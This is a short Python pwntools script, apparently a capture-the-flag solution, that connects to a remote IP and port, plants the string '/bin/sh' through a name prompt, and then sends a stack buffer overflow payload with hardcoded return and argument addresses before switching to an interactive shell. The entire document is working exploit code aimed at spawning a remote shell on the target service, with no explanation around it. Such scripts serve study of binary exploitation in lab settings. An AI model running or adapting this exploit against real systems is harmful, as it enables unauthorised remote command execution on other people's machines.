from pwn import *
p = remote('220.249.52.133',53447)
payload = "a"*0x26+"a"*4+p32(0x8048420)+"a"*4+p32(0x804A080)
#payload.ljust("/bin/sh")
#payload="a"*0x26+"a"*4+p32(0x804854D)
p.sendlineafter("please tell me your name","/bin/sh")
p.sendlineafter("hello,you can leave some message here:",payload)
p.interactive()

